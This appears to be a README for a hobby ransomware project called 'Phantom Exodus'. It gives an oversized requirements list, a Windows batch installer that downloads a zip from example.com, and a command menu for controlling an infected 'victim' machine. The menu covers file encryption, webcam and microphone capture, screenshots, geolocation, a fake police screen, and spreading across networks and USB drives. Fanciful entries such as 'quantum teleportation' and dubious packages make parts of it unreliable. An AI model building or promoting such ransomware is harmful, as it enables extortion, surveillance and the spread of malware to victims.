# ya_ransomware
📜 # REQUIREMENTS.TXT
# Core
python>=3.11
pyttsx3>=2.90
discord.py>=2.3.0
pyautogui>=0.9.54
psutil>=5.9.5
pywin32>=305
numpy>=1.24.0
opencv-python>=4.8.0

# AI/ML
torch>=2.0.0
torchvision>=0.15.0
torchaudio>=2.0.0
tensorflow>=2.13.0
scikit-learn>=1.3.0
transformers>=4.30.0

# Quantum
qiskit>=0.43.0
cryptography>=41.0.0

# Networking
requests>=2.31.0
beautifulsoup4>=4.12.0
aiohttp>=3.8.0
websockets>=11.0.0

# System
pynput>=1.7.0
pyperclip>=1.8.2
screeninfo>=0.8
pygetwindow>=0.0.9
keyboard>=0.13.5
mouse>=0.7.1

# Multimedia
Pillow>=10.0.0
pygame>=2.5.0
pyaudio>=0.2.11
SpeechRecognition>=3.10.0
gTTS>=2.3.2

# GUI
tkinter>=8.6
PyQt5>=5.15.0
rich>=13.0.0
colorama>=0.4.0

# Security
pycryptodome>=3.18.0
steganography>=0.1.1
obfuscation>=0.1.0

# Hardware
pyserial>=3.5
pyusb>=1.2.0
smbus>=1.1
RPi.GPIO>=0.7.0

# Blockchain
web3>=6.0.0
bitcoin>=1.1.0


# INSTALLATION SCRIPT
@echo off
echo ========================================
echo   PHANTOM EXODUS INSTALLATION
echo ========================================
echo.
echo Installing dependencies...

:: Check for Python
python --version >nul 2>&1
if errorlevel 1 (
    echo Python not found! Installing...
    powershell -Command "Start-Process https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe -Wait"
    echo Please restart installation after Python installs.
    pause
    exit
)

:: Create virtual environment
echo Creating virtual environment...
python -m venv phantom_env
call phantom_env\Scripts\activate.bat

:: Install dependencies
echo Installing dependencies...
pip install --upgrade pip
pip install pyttsx3 discord.py pyautogui psutil pywin32 numpy opencv-python
pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118
pip install tensorflow
pip install qiskit cryptography beautifulsoup4 requests
pip install screeninfo pynput pyperclip

:: Download additional libraries
echo Downloading quantum libraries...
curl -o quantum_lib.zip https://example.com/quantum_lib.zip
tar -xf quantum_lib.zip

echo.
echo ========================================
echo   INSTALLATION COMPLETE!
echo ========================================
echo.
echo To run Phantom Exodus:
echo 1. Activate: phantom_env\Scripts\activate
echo 2. Run: python phantom_exodus.py
echo.
pause



# commands controls 
# In the horror chat interface:
HELP         - Show all commands
STATUS       - Show attack status
ENCRYPT      - Start quantum encryption
DECRYPT KEY  - Attempt decryption with key
GEOLOCATE    - Show victim location
WEBCAM       - Capture webcam image
MIC          - Record microphone
SCREENSHOT   - Take screenshot
FILES        - List encrypted files
SPEAK TEXT   - Speak text to victim
POLICE       - Show FBI/police screen
SPREAD       - Spread to network
USB          - Infect USB drives
SATURNV      - Launch Saturn V propagation
MATRIX       - Show Matrix terminal
QUANTUM      - Quantum teleportation demo
DIMENSIONS   - Show parallel dimensions
NEURAL       - Neural interface demo
EXIT         - Terminate (requires admin key)

